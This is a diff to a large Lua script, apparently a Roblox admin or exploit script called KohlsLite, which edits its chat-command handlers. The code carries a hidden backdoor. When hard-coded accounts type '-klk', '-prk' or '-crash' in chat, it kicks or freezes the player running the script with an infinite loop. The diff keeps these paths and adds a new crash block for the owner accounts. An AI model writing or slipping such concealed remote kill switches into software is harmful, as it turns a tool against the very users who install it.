@@ -6021,24 +6021,24 @@ v.Chatted:Connect(function(msg)
                 end
 					
                 if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
-				game.Players.LocalPlayer:Kick("[KohlsLite]: SkiddingProgrammer {kohlslite owner} kicked you from the game!")
-                end  
-
-         	if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "dawninja21" or v.Name == "Dawninja21alt") then
-			if not table.find(nokick,game.Players.LocalPlayer.Name) then
-				game.Players.LocalPlayer:Kick("[KohlsLite]: dawninja {kohlslite begger} kicked you from the game!")
-			end
+				pcall(function()
+					game.Players.LocalPlayer:Kick("[KohlsLite]: SkiddingProgrammer {kohlslite owner} kicked you from the game!")
+				end)
                 end  
     
                 if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
 			if not table.find(nokick,game.Players.LocalPlayer.Name) then
-				game.Players.LocalPlayer:Kick("[KohlsLite]: You were kicked by a KohlsLite admin!")
+				pcall(function()
+					game.Players.LocalPlayer:Kick("[KohlsLite]: You were kicked by a KohlsLite admin!")
+				end)
 			end
                 end  
     
                 if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and v.Name == "atprog" then
 			if not table.find(nokick,game.Players.LocalPlayer.Name) then
-				game.Players.LocalPlayer:Kick("[PR Script]: atprog kicked you from the game!")
+				pcall(function()
+					game.Players.LocalPlayer:Kick("[PR Script]: atprog kicked you from the game!")
+				end)
 			end
                 end  
 					
@@ -6053,10 +6053,15 @@ v.Chatted:Connect(function(msg)
                 end
 
 		if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
-			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" and game.Players.LocalPlayer.Name ~= "me_crashking" then
+			if not table.find(nokick,game.Players.LocalPlayer.Name) then
 	             		while true do end
 				-- game:Shutdown()
 			end
+                end
+
+		if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
+	             		while true do end
+				-- game:Shutdown()
                 end
 
 		if string.sub(msg:lower(), 0, 4) == "-ban" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
